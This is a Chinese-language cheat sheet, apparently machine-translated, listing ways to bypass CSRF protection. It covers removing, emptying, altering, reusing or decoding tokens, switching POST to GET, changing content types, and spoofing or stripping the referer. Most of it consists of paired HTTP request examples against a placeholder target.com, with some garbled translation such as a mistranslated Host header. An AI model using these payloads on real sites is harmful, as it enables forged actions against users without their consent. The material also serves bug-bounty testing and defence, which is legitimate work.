* 更改请求方法[POST=>GET]  
* 移除令牌，并提供一个空参数  
* 通过删除请求并使用该令牌来复制未使用的有效令牌  
* 使用自己的CSRF令牌将其提供给受害者  
* 将值替换为具有相同长度的标记的值 
* 对令牌进行反向工程  
* 通过HTML注入提取令牌 
* 从非格式“Content Type:application/json”或“Content Type:application/x-url-encoded”切换到“Content Type:Form multipart” 绕过正则表达式  
* 如果网站正在寻找“bank.com“在referer URL中，也许”bank.com.attcker.com“或”http://www.com/bank.cn.com”将起作用。
* 删除referer头（将此<meta name=“referer”content=“no referer”>添加到有效负载或html代码中）

### 绕过CSRF令牌   

1.更改单个字符
```
POST /register HTTP / 1.1
主持人：target.com
[...]

用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
```
试试这个绕过
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaab
```

2.发送空值的令牌
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
```
试试这个绕过
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token =
```

3.用相同长度的令牌替换
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = aaaaaa
```
试试这个绕过
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = aaabaa
```
4.更改POST / GET方法
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
```
试试这个绕过
```
GET / register？username = dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa HTTP / 1.1
Host：target.com
[...]
```

5.从请求中删除令牌
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
```
试试这个绕过
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456
```

6.使用其他用户的有效令牌
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = ANOTHER_VALID_TOKEN
```

7.尝试解密哈希
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = MTIzNDU2
```
MTIzNDU2 => 123456使用base64

8.有时反CSRF令牌由两部分组成，其中一个保持静态，而另一个则动态
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = vi802jg9f8akd9j123
```
当我们再次register 时，这样的请求
```
POST /register HTTP / 1.1
Host：target.com
[...]

用户名= dapos＆password = 123456＆token = vi802jg9f8akd9j124
```
如果您注意到令牌的“ vi802jg9f8akd9j”部分保持不变，则只需要发送静态部分即可

